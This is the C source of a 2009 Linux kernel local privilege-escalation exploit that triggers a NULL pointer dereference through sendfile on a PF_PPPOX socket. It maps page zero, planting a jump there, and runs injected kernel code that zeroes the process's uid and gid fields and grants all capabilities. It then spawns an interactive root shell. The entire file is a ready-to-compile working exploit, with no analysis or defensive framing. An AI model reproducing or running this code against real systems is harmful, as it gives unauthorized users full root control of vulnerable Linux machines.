/*
 * 14.08.2009, babcia padlina
 *
 * vulnerability discovered by google security team
 *
 * some parts of exploit code borrowed from vmsplice exploit by qaaz
 * per_svr4 mmap zero technique developed by Julien Tinnes and Tavis Ormandy:
 *     http://xorl.wordpress.com/2009/07/16/cve-2009-1895-linux-kernel-per_clear_on_setid-personality-bypass/
 */

#include <stdio.h>
#include <sys/socket.h>
#include <sys/user.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <inttypes.h>
#include <sys/reg.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/personality.h>

static unsigned int uid, gid;

#define USER_CS	0x73
#define USER_SS	0x7b
#define USER_FL	0x246
#define STACK(x) (x + sizeof(x) - 40)

void exit_code();
char exit_stack[1024 * 1024];

static inline __attribute__((always_inline)) void *get_current()
{
	unsigned long curr;
	__asm__ __volatile__ (
		"movl %%esp, %%eax ;"
		"andl %1, %%eax ;"
		"movl (%%eax), %0"
		: "=r" (curr)
		: "i" (~8191)
	);
	return (void *) curr;
}

static inline __attribute__((always_inline)) void exit_kernel()
{
	__asm__ __volatile__ (
		"movl %0, 0x10(%%esp) ;"
		"movl %1, 0x0c(%%esp) ;"
		"movl %2, 0x08(%%esp) ;"
		"movl %3, 0x04(%%esp) ;"
		"movl %4, 0x00(%%esp) ;"
		"iret"
		: : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),
		    "i" (USER_CS), "r" (exit_code)
    	);
}

void kernel_code()
{
	int i;
	uint *p = get_current();

	for (i = 0; i < 1024-13; i++) {
		if (p[0] == uid && p[1] == uid && p[2] == uid && p[3] == uid && p[4] == gid && p[5] == gid && p[6] == gid && p[7] == gid) {
 			p[0] = p[1] = p[2] = p[3] = 0;
			p[4] = p[5] = p[6] = p[7] = 0;
			p = (uint *) ((char *)(p + 8) + sizeof(void *));
			p[0] = p[1] = p[2] = ~0;
			break;
		}
		p++;
	}

	exit_kernel();
}

void exit_code()
{
	if (getuid() != 0) {
		fprintf(stderr, "failed\n");
		exit(-1);
	}

	execl("/bin/sh", "sh", "-i", NULL);
}

int main(void) {
	char template[] = "/tmp/padlina.XXXXXX";
	int fdin, fdout;
	void *page;

	uid = getuid();
	gid = getgid();
	setresuid(uid, uid, uid);
	setresgid(gid, gid, gid);

	if ((personality(0xffffffff)) != PER_SVR4) {
		if ((page = mmap(0x0, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS, 0, 0)) == MAP_FAILED) {
			perror("mmap");
			return -1;
		}
	} else {
		if (mprotect(0x0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) < 0) {
			perror("mprotect");
			return -1;
		}
	}

	*(char *)0 = '\x90';
	*(char *)1 = '\xe9';
	*(unsigned long *)2 = (unsigned long)&kernel_code - 6;

	if ((fdin = mkstemp(template)) < 0) {
		perror("mkstemp");
		return -1;
	}

	if ((fdout = socket(PF_PPPOX, SOCK_DGRAM, 0)) < 0) {
		perror("socket");
		return -1;
	}

	unlink(template);
	ftruncate(fdin, PAGE_SIZE);
	sendfile(fdout, fdin, NULL, PAGE_SIZE);
}

